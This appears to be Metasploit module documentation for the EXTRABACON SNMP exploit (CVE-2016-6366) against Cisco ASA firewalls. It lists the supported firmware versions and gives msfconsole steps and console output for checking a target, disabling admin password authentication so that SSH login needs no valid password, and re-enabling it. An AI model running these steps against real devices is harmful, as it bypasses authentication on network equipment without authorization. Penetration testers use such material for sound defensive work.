## General notes

This is using improved shellcode, has less stages than the Equation Group
version making it more reliable. This makes the SNMP payload packet ~150 less
bytes. Also, the leaked version only supports 8.x, we have it working on 9.x
versions.

To add more version specific offsets, more details and a Lina file offset
finder are available at:

https://github.com/RiskSense-Ops/CVE-2016-6366

## Partial list of supported versions
------------------------------------------------------------
All of the leaked versions are available in the module

- 8.x
- 8.0(2)
- 8.0(3)
- 8.0(3)6
- 8.0(4)
- 8.0(4)32
- 8.0(5)
- 8.2(1)
- 8.2(2)
- 8.2(3)
- 8.2(4)
- 8.2(5)
- 8.2(5)33 `*`
- 8.2(5)41 `*`
- 8.3(1)
- 8.3(2)
- 8.3(2)39 `*`
- 8.3(2)40 `*`
- 8.3(2)-npe `*` `**`
- 8.4(1)
- 8.4(2)
- 8.4(3)
- 8.4(4)
- 8.4(4)1 `*`
- 8.4(4)3 `*`
- 8.4(4)5 `*`
- 8.4(4)9 `*`
- 8.4(6)5 `*`
- 8.4(7) `*`
- 9.x
- 9.0(1) `*`
- 9.1(1)4 `*`
- 9.2(1) `*`
- 9.2(2)8 `*`
- 9.2(3) `*`
- 9.2(4) `*`
- 9.2(4)13 `*`

`*` new version support not part of the original Shadow Brokers leak

`**` We currently can't distinguish between normal and NPE versions from the SNMP strings. We've commented out the NPE offsets, as NPE is very rare (it is for exporting to places where encryption is crappy), but in the future, we'd like to incorporate these versions. Perhaps as a bool option?

## Verification Steps

- Start `msfconsole`
- `use auxiliary/admin/cisco/cisco_asa_extrabacon`
- `set RHOST x.x.x.x`
- `check`
- `run`
- ssh admin@x.x.x.x, you will not need a valid password
- `set MODE pass-enable`
- `run`
- ssh admin@x.x.x.x, ensure fake password does not work

## Checking for a vulnerable version

```
msf > use auxiliary/admin/cisco/cisco_asa_extrabacon
msf auxiliary(cisco_asa_extrabacon) > set rhost 192.168.1.1
rhost => 192.168.1.1
msf auxiliary(cisco_asa_extrabacon) > check

[+] Payload for Cisco ASA version 8.2(1) available!
[*] 192.168.1.1:161 The target appears to be vulnerable.
```

## Disabling administrative password

```
  msf auxiliary(cisco_asa_extrabacon) > set
set ACTION            set ConsoleLogging    set Prompt            set RHOST             set TimestampOutput
set CHOST             set LogLevel          set PromptChar        set RPORT             set VERBOSE
set COMMUNITY         set MODE              set PromptTimeFormat  set SessionLogging    set VERSION
set CPORT             set MinimumRank       set RETRIES           set TIMEOUT           set WORKSPACE
msf auxiliary(cisco_asa_extrabacon) > set MODE pass-
  set MODE pass-disable  set MODE pass-enable
msf auxiliary(cisco_asa_extrabacon) > set MODE pass-disable
MODE => pass-disable
msf auxiliary(cisco_asa_extrabacon) > run

[*] Building pass-disable payload for version 8.2(1)...
  [*] Sending SNMP payload...
  [+] Clean return detected!
[!] Don't forget to run pass-enable after logging in!
[*] Auxiliary module execution completed
```

## Re-enabling administrative password

```
msf auxiliary(cisco_asa_extrabacon) > set MODE pass-enable
MODE => pass-enable
msf auxiliary(cisco_asa_extrabacon) > run

[*] Building pass-enable payload for version 8.2(1)...
  [*] Sending SNMP payload...
  [+] Clean return detected!
[*] Auxiliary module execution completed
```
